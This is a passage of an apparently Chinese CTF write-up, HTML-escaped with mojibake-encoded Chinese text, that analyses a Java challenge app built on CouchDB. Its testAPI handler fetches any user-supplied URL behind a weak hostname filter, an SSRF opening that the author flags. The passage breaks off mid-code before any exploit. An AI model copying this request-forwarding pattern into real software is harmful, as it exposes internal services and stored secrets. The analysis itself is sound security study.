&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">16&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">validateAlphanumeric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">putAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">has&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ok&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBoolean&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ok&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Database creation failed&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">initializeDatabase&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">createDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;_replicator&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">Utils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">logException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Replicator already initialized&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">createDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;_users&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">Utils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">logException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Users already initialized&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">createDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;log&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">Utils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">logException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Log already initialized&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>é€šè¿‡å‘æž„é€ å¥½çš„urlå‘é€httpè¯·æ±‚æ¥åˆ›å»ºæ•°æ®åº“ï¼Œæœ‰ä¸‰ä¸ªé»˜è®¤çš„åº“ï¼š_replicator, _users, log&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">createUser&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">16&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">validateAlphanumeric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">16&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">validateAlphanumeric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal password&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// ... boring java stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">putAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;_users/org.couchdb.user:&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">userObj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#75715e">// ... boring java stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">addUserToDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">dbName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">dbName&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">16&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">validateAlphanumeric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">dbName&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal dbname&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">16&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">validateAlphanumeric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal username&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// ... boring java stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">putAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;/_security&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">configObj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#75715e">// ... boring java stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">insertDocumentToDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">dbName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// ... boring java stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">postAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// ... boring java stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™éƒ¨åˆ†æ˜¯åˆ›å»ºç”¨æˆ·å¹¶æ’å…¥æ•°æ®åº“ä¸­ å¹¶ä¸”æ’å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œæ¬¸ ç”¨çš„ä¹Ÿæ˜¯httpå‘è¯·æ±‚è¿™ä¸€æ‹› è¿™ä¸å°±å¯æŽ§äº†ï¼Ÿ&lt;/p>
&lt;p>è¿™é‡Œå°±å®Œäº†ï¼Œè½¬åŽ»çœ‹Handlers.class&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">createUser&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Context&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">queryParam&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">queryParam&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createUser&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addUserToDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">flagDoc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">JSONObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#111">flagDoc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">insertDocumentToDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">flagDoc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;success&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InternalServerErrorResponse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Something went wrong&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å½“å‘å‡ºä¸€ä¸ªè¯·æ±‚ å¸¦ç€usernameå’Œpasswdæ—¶ï¼Œå®ƒä¼šè°ƒç”¨&lt;code>createUser()&lt;/code>åˆ›å»ºä¸€æ¡ç”¨æˆ·çš„æ•°æ®å­˜å…¥åº“ä¸­ï¼Œå¹¶ä¸”å­˜ä¸€ä¸ªflagDocï¼›æŽ¥ç€çœ‹æœ€åŽä¸€ä¸ªtestAPI&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">testAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Context&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">queryParam&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">queryParam&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;method&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">queryParam&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;data&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">urlURI&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URL&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">urlURI&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getHost&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">contains&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;couchdb&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ForbiddenResponse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal!&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">MalformedURLException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BadRequestResponse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Input URL is malformed&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;GET&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">jsonObj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">jsonObj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">jsonObj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">postAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
